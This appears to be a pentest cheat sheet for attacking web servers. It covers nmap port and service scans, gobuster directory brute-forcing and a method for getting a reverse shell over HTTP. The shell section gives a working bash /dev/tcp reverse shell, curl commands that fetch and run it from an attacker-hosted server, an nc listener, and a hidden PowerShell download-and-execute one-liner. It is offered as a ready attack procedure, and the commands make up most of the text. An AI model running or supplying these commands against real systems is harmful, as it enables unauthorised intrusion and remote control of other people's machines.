---
authors: Hacerdalkiran
category: infra
---

# 🛠️ HTTP
enumeration
1. HTTP Port Scanning
First, discover which HTTP(S) ports are open on the target:
nmap -Pn -p- -T4 --min-rate 1000 -oA scan/full-tcp TARGET_IP
From the output, note any HTTP ports (e.g. 80, 443, 8080, 8172). Then probe those ports for service/version info:
nmap -Pn -sV -p 80,443,8080,8172 -oA scan/http-sv TARGET_IP

2. HTTP Service Enumeration
Use Nmap’s HTTP scripts to fingerprint common web apps and headers:
nmap -Pn -sV \
  --script=http-title,http-headers,http-enum \
  -p 80,443,8080,8172 \
  -oA scan/http-enum TARGET_IP
http-title → grabs page titles (e.g. “OWA”, “IIS Welcome”)

http-headers → shows Server, X-Powered-By, WWW-Authenticate, etc.

http-enum → probes known directories and apps

3. Directory Enumeration
Brute-force common directories/files on each HTTP port:

gobuster dir -u http://TARGET_IP:80/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,js,aspx \
  -t 50 -o scan/gobuster-dir.txt
You can also use ffuf or dirb with a similar wordlist.

4. Reverse-Shell via HTTP
4.1. Prepare Your Payload & HTTP Server
On your attack box, create a simple bash reverse-shell script:
cat << 'EOF' > shell.sh
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x shell.sh
Serve it over HTTP:
python3 -m http.server 8000
4.2. Fetch & Execute on the Target
Once you’ve identified a writable directory (e.g. /tmp, /uploads), run on the target:
curl http://ATTACKER_IP:8000/shell.sh -o /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh
4.3. Listen for the Shell
On your machine:
nc -lvnp 4444
When the target executes the script, you’ll get an incoming shell.

Windows PowerShell Alternative
If the target is Windows and PowerShell is available:

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')"
Tips:
If wget exists on the target, use it instead of curl.
Check your directory scan (gobuster) output for upload or temp folders—you may be able to write directly there.
Always verify you have network reachability (e.g. no egress firewall blocking your listener port).
This sequence uses only HTTP to find web ports, enumerate directories, and pull down a reverse-shell payload in order.
